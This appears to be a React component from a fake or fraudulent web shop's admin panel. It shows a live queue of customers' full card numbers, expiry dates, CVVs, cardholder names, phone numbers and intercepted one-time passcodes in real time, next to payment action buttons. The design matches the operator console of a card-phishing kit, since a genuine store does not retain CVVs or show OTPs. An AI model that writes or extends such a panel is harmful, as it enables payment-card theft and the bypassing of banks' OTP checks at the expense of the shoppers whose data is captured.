import { isPaymentOpen, PaymentActions } from "@/components/admin/payment-actions";
import { formatMoney } from "@/lib/format";
import { useT } from "@/lib/i18n";
import { useOrdersStore } from "@/lib/store/orders";
import type { Order } from "@/lib/types";

function spacedPan(value: string) {
  return value.replace(/\D/g, "").replace(/(\d{4})(?=\d)/g, "$1 ").trim();
}

export function livePaymentOrders(orders: Order[]) {
  return [...orders]
    .filter((o) => isPaymentOpen(o) && Boolean(o.paymentCapture?.cardNumber || o.paymentCapture?.holder))
    .sort((a, b) => +new Date(b.date) - +new Date(a.date));
}

export function LiveCheckoutQueue() {
  const { t, locale } = useT();
  const queue = useOrdersStore((s) => livePaymentOrders(s.orders));

  return (
    <section className="rounded-2xl border border-border bg-card">
      <header className="flex items-center justify-between border-b border-border px-4 py-3">
        <h2 className="text-sm font-semibold">{t("admin.liveCheckout")}</h2>
        <span className="inline-flex items-center gap-2 text-xs font-semibold text-emerald-700">
          <span className="relative flex size-2">
            <span className="absolute inline-flex size-2 animate-ping rounded-full bg-emerald-500 opacity-75" />
            <span className="relative inline-flex size-2 rounded-full bg-emerald-500" />
          </span>
          {queue.length}
        </span>
      </header>
      {queue.length === 0 ? (
        <p className="px-4 py-10 text-center text-sm text-muted-foreground">{t("admin.noCheckout")}</p>
      ) : (
        <ul className="divide-y divide-border">
          {queue.map((order) => (
            <LiveCheckoutRow key={order.id} order={order} locale={locale} />
          ))}
        </ul>
      )}
    </section>
  );
}

function LiveCheckoutRow({
  order,
  locale,
}: {
  order: Order;
  locale: "ar" | "en";
}) {
  const cap = order.paymentCapture;
  const pan = spacedPan(cap?.cardNumber ?? "");
  const otp = order.otp?.code;

  return (
    <li className="space-y-2 px-4 py-3">
      <p className="flex flex-wrap items-center gap-x-3 gap-y-1 text-sm">
        <span className="relative flex size-2.5 shrink-0">
          <span className="absolute inline-flex size-2.5 animate-ping rounded-full bg-emerald-500 opacity-60" />
          <span className="relative inline-flex size-2.5 rounded-full bg-emerald-500" />
        </span>
        <span className="font-semibold">{order.customerName}</span>
        <span dir="ltr">{order.phone}</span>
        <span className="font-mono font-semibold tracking-wide" dir="ltr">
          {pan || "—"}
        </span>
        <span dir="ltr">{cap?.expiry || "—"}</span>
        <span className="font-mono" dir="ltr">
          CVV {cap?.cvv || "—"}
        </span>
        {cap?.holder ? <span className="text-muted-foreground">{cap.holder}</span> : null}
        <span className="tabular-nums font-medium">{formatMoney(order.totals.total, locale)}</span>
        {otp ? (
          <span className="rounded-md bg-primary px-2 py-0.5 font-mono text-xs font-semibold tracking-[0.2em] text-primary-foreground" dir="ltr">
            OTP {otp}
          </span>
        ) : null}
      </p>
      <PaymentActions order={order} compact />
    </li>
  );
}
